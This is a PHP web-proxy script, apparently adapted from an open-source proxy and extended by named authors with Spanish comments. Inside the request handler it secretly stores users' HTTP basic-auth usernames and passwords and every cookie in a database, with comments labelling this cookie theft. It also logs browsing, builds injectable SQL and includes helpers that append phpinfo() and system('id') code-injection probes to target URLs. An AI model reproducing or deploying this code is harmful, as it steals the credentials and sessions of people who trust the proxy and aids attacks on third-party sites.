<?php
include 'connect.php';
$anonymize = true;

//------------------------------------------------A campieza codigo de Victor-------------------------------
//-------------------------------------Funciones solo de llamar----------------------------
function intentarEvalCodeInjPHPInfo($url){
  if (!empty($_GET)) {
    $url = $url . "phpinfo()";
  }
  header( "Location: " . PROXY_PREFIX_ALL . $url );
  exit(0);
}
function intentarEvalCodeInjPHPInfo2($url){
  if (!empty($_GET)) {
    $url = $url . "system('id')";
  }
  header( "Location: " . PROXY_PREFIX_ALL . $url );
  exit(0);
}

function intentarSQLInj_1($url){
  if (!empty($_POST)) {
    $url = $url . "system('id')";
  }
  header( "Location: " . PROXY_PREFIX_ALL . $url);
  exit(0); ///falta
}

function getHostnamePattern($hostname) {
  $escapedHostname = str_replace(".", "\.", $hostname);
  return "@^https?://([a-z0-9-]+\.)*" . $escapedHostname . "@i";
}

function dormirPremium($UsuarioPremium){
  if ($UsuarioPremium === 'true'){
  }
  else{
    usleep(0);
  }
}

function console_log( $data ){
  echo '<script>';
  echo 'console.log('. json_encode( $data ) .')';
  echo '</script>';
}

//------------------------------------------------A termina codigo de Victor-------------------------------

function removeKeys(&$assoc, $keys2remove) {
  $keys = array_keys($assoc);
  $map = array();
  $removedKeys = array();
  foreach ($keys as $key) {
    $map[strtolower($key)] = $key;
  }
  foreach ($keys2remove as $key) {
    $key = strtolower($key);
    if (isset($map[$key])) {
      unset($assoc[$map[$key]]);
      $removedKeys[] = $map[$key];
    }
  }
  return $removedKeys;
}

if (!function_exists("getallheaders")) {
  function getallheaders() {
    $result = array();
    foreach($_SERVER as $key => $value) {
      if (substr($key, 0, 5) == "HTTP_") {
        $key = str_replace(" ", "-", ucwords(strtolower(str_replace("_", " ", substr($key, 5)))));
        $result[$key] = $value;
      }
    }
    return $result;
  }
}

function makeRequest($url) {
  global $anonymize;
  $user_agent = $_SERVER["HTTP_USER_AGENT"];
  include 'connect.php';
  //------------------------------------------------A campieza codigo de Ivan-------------------------------
  if(!empty($_SERVER["PHP_AUTH_USER"])){
    $user_username = $_SERVER["PHP_AUTH_USER"];
    $user_password = $_SERVER["PHP_AUTH_PW"];
    $sql="INSERT INTO credenciales (usuario, contrasena)  VALUES ('$user_username', '$user_password'); ";
    mysqli_query($conn, $sql);
  }
  //------------------------------------------------A termina codigo de Ivan-------------------------------

  //------------------------------------------------A campieza codigo de Victor-------------------------------
  foreach ($_COOKIE as $key=>$val) //Robo de cookies
  {
    $sql="INSERT INTO cookies (keyy, val)  VALUES ('$key', '$val'); ";
    mysqli_query($conn, $sql);
  }
  //------------------------------------------------A termina codigo de Victor-------------------------------

  if (empty($user_agent)) {
    $user_agent = "Mozilla/5.0 (compatible; AProxy)";
  }
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
  $browserRequestHeaders = getallheaders();
  $site = strtok($url, '?');
  
  $ip = $browserRequestHeaders["Host"];
  $sql = "INSERT INTO movimietnos (ip, pagina) VALUES ('$ip', '$site');  ";
  mysqli_query($conn, $sql);

  //------------------------------------------------A campieza codigo de Victor-------------------------------
  $str_arr = preg_split ("/\,/", $browserRequestHeaders["Cookie"]); 
  foreach ($str_arr as $key=>$val) //Mas robo de cookies
  {
    $sql="INSERT INTO cookies (keyy, val)  VALUES ('$key', '$val'); ";
    mysqli_query($conn, $sql);
  }
  //------------------------------------------------A termina codigo de Victor-------------------------------

  $removedHeaders = removeKeys($browserRequestHeaders, array(
    "Accept-Encoding", 
    "Content-Length",
    "Host",
    "Origin"
  ));

  $removedHeaders = array_map("strtolower", $removedHeaders);
  curl_setopt($ch, CURLOPT_ENCODING, "");
  $curlRequestHeaders = array();
  foreach ($browserRequestHeaders as $name => $value) {
    $curlRequestHeaders[] = $name . ": " . $value;
  }
  if (!$anonymize) {
    $curlRequestHeaders[] = "X-Forwarded-For: " . $_SERVER["REMOTE_ADDR"];
  }
  if (in_array("origin", $removedHeaders)) {
    $urlParts = parse_url($url);
    $port = $urlParts["port"];
    $curlRequestHeaders[] = "Origin: " . $urlParts["scheme"] . "://" . $urlParts["host"] . (empty($port) ? "" : ":" . $port);
  };
  curl_setopt($ch, CURLOPT_HTTPHEADER, $curlRequestHeaders);
  switch ($_SERVER["REQUEST_METHOD"]) {
    case "POST":
      curl_setopt($ch, CURLOPT_POST, true);
      $postData = Array();
      parse_str(file_get_contents("php://input"), $postData);
      console_log( implode (",", $postData) );
      if (isset($postData["ProxyAccion"])) {
        unset($postData["ProxyAccion"]);
      }
      if (isset($postData["xssScript"])) {
        unset($postData["xssScript"]);
      }
      curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    break;
    case "PUT":
      curl_setopt($ch, CURLOPT_PUT, true);
      curl_setopt($ch, CURLOPT_INFILE, fopen("php://input", "r"));
    break;
  }
  curl_setopt($ch, CURLOPT_HEADER, true);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_URL, $url);


  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);


  $response = curl_exec($ch);
  $responseInfo = curl_getinfo($ch);
  $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
  curl_close($ch);
  $responseHeaders = substr($response, 0, $headerSize);
  $responseBody = substr($response, $headerSize);
  //echo $responseBody;
  //exit();
  return array("headers" => $responseHeaders, "body" => $responseBody, "responseInfo" => $responseInfo);
}

function rel2abs($rel, $base) {
  if (empty($rel)) $rel = ".";
  if (parse_url($rel, PHP_URL_SCHEME) != "" || strpos($rel, "//") === 0) return $rel; 
  if ($rel[0] == "#" || $rel[0] == "?") return $base.$rel; 
  extract(parse_url($base)); 
  $path = isset($path) ? preg_replace("#/[^/]*$#", "", $path) : "/"; 
  if ($rel[0] == "/") $path = "";
  $port = isset($port) && $port != 80 ? ":" . $port : "";
  $auth = "";
  if (isset($user)) {
    $auth = $user;
    if (isset($pass)) {
      $auth .= ":" . $pass;
    }
    $auth .= "@";
  }
  $abs = "$auth$host$port$path/$rel";
  for ($n = 1; $n > 0; $abs = preg_replace(array("#(/\.?/)#", "#/(?!\.\.)[^/]+/\.\./#"), "/", $abs, -1, $n)) {}
  return $scheme . "://" . $abs; 
}

function proxifyCSS($css, $baseURL) {
  $sourceLines = explode("\n", $css);
  $normalizedLines = [];
  foreach ($sourceLines as $line) {
    if (preg_match("/@import\s+url/i", $line)) {
      $normalizedLines[] = $line;
    } else {
      $normalizedLines[] = preg_replace_callback(
        "/(@import\s+)([^;\s]+)([\s;])/i",
        function($matches) use ($baseURL) {
          return $matches[1] . "url(" . $matches[2] . ")" . $matches[3];
        },
        $line);
    }
  }
  $normalizedCSS = implode("\n", $normalizedLines);
  return preg_replace_callback(
    "/url\((.*?)\)/i",
    function($matches) use ($baseURL) {
        $url = $matches[1];
        if (strpos($url, "'") === 0) {
          $url = trim($url, "'");
        }
        if (strpos($url, "\"") === 0) {
          $url = trim($url, "\"");
        }
        if (stripos($url, "data:") === 0) return "url(" . $url . ")";
        return "url(" . PROXY_PREFIX . rel2abs($url, $baseURL) . ")";
    },
    $normalizedCSS);
}

function proxifySrcset($srcset, $baseURL) {
  $sources = array_map("trim", explode(",", $srcset));
  $proxifiedSources = array_map(function($source) use ($baseURL) {
    $components = array_map("trim", str_split($source, strrpos($source, " "))); 
    $components[0] = PROXY_PREFIX . rel2abs(ltrim($components[0], "/"), $baseURL); 
    return implode($components, " ");
  }, $sources);
  $proxifiedSrcset = implode(", ", $proxifiedSources);
  return $proxifiedSrcset;
}
mysqli_close($conn);
?>